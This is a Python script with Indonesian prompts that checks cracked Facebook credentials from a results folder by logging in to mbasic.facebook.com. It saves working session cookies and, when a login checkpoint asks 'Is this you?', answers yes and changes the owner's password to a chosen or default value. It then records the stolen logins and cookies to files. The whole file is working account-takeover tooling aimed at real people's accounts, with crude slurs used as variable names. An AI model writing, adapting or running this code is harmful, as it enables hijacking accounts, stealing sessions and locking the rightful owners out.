import requests, os, bs4, re
from bs4 import BeautifulSoup
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.panel import Panel

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

### WARNA MODULE RICH ###
merah  = '[#FF0022]'
pink   = '[deep_pink3]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
aman,cp,salah=0,0,0
ubahP, pwBaru=[],[]
data,data2={},{}

def gabut():
    try:dirs = os.listdir("results/CP")
    except FileNotFoundError:
        prints(Panel(f"🙁 {merah}tidak ada file yang mau di cek{hapus}"));exit()
    if len(dirs)==0:
        prints(Panel(f"🙁 {merah}tidak ada file yang mau di cek{hapus}"));exit()
    else:
        prints(Panel("       [[bold cyan] hasil crack yang tersimpan di file anda [/]]"))
        kon = 0
        tol = {}
        for isi in dirs:
            try:xxxx = open(f"results/CP/{isi}", "r").readlines()
            except:continue
            kon+=1
            if kon<10:
                nom = "0"+str(kon)
                tol.update({str(kon):str(isi)})
                tol.update({nom:str(kon)})
                print(f"  [{O}{nom}{N}] {isi} -> {H}{str(len(xxxx))}{N}")
            else:
                tol.update({str(kon):str(isi)})
                print(f"  [{O}{nom}{N}] {isi} -> {H}{str(len(xxxx))}{N}")
        prints(Panel(f"         {biru_m}SILAHKAN PILIH NOMOR YANG MAU ANDA CEK{hapus}"))
        file = input(f"  [{M}?{N}] nomor : ")
        try:ajg = tol[file]
        except KeyError:
            prints(Panel(f"😡 file {merah}{file}{hapus} tidak ada cek nomor nya pler"));exit()
        try:
           buka_baju = open(f"results/CP/{ajg}", "r").readlines()
        except IOError:
            print(f"  [{M}!{N}] file tidak ada");exit()
        wwx=input(f"  [{O}?{N}] ubah password ketika tap yes [Y/t]: ")
        if wwx in ["Y","y"]:
            ubahP.append("y")
            prints(Panel("Jika ingin mengubah kata sandi Ketika tab yes, gunakanlah password minimal 6 huruf. contoh: [green]yayanxd[/]"))
            pwBar=input(f"  [{H}+{N}] masukan password baru : ")
            if len(pwBar) <= 5:
                print(f"  [{M}!{N}] kata sandi minimal 6 karakter")
            else:
                pwBaru.append(pwBar)
        prints(Panel(f"[[bold green]+[/]] Total akun : [bold cyan]{str(len(buka_baju))}[/]"))
        for memek in buka_baju:
            kontol = memek.replace('\n', '')
            titid  = kontol.split('|')
            try:
                log_hasil(titid[0].replace(" [×] ", ""), titid[1])
            except requests.exceptions.ConnectionError:
                continue
            print("")
        print("")
        prints(Panel("[bold green]Proses Pengecekan Selesai[/]"))
        try:os.remove(buka_baju)
        except:pass
        exit()
# ------- CHECKPOINT DETEDTOR --------
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
    soup=BeautifulSoup(session.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        print("\r Hidupkan mode pesawat")
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            prints(Panel(f"""\r[{merah}>[/]] {kuning}{user}|{pasw}{hapus}
😭 akun ini terpasang autentikasi dua faktor""", title=f"{merah}MENCOBA LOGIN[/]"))
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f" [✓] {user}|{pasw}|{coki}\n")
            prints(Panel(f"""\r[{hijau}✓[/]] {hijau}{user}|{pasw}{hapus}
🥳 Hore akun ini tidak checkpoint""", title=f"{merah}MENCOBA LOGIN[/]"))
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post("https://mbasic.facebook.com"+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "YayanGanteng:v"
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                prints(Panel(f"""\r[{merah}>[/]] {kuning}{user}|{pasw}{hapus}
😭 akun ini terpasang autentikasi dua faktor""", title=f"{merah}MENCOBA LOGIN[/]"))
            else:
                prints(Panel(f"""\r[{merah}>[/]] {kuning}{user}|{pasw}{hapus}
🤔 gagal login kemungkinan password sudah di ganti.""", title=f"{merah}MENCOBA LOGIN[/]"))
        else:
            for opt in range(len(cek)):
                tod = f"\r[{merah}>[/]] {kuning}{user}|{pasw}{hapus}\n[{biru_m}+{hapus}] Terdapat {hijau}{str(len(cek))}{hapus} opsi.\n[{pink}{str(opt+1)}{hapus}] [bold blue]{cek[opt]}[/]"
                prints(Panel(tod, title=f"{merah}MENCOBA LOGIN[/]"))
    else:
        prints(Panel(f"""[{merah}>[/]] {kuning}{user}|{pasw}[/]
😔 Kata sandi salah atau sudah diubah""", title=f"{merah}MENCOBA LOGIN[/]"))
# ------- UBAH PASSWORD --------
def ubah_pw(session,response,link2,user,pwx):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post("https://mbasic.facebook.com"+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(pwx)})
        an=session.post("https://mbasic.facebook.com"+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        open('results/TAB-YES.txt', 'a').write(f" [✓] {user}|{''.join(pwx)}|{coki}\n")
        prints(Panel(f"\r[{hijau}✓[/]] {hijau}{user}|{''.join(pwx)}|{coki}[/]", title=f"{hijau}TAB YES[/]"))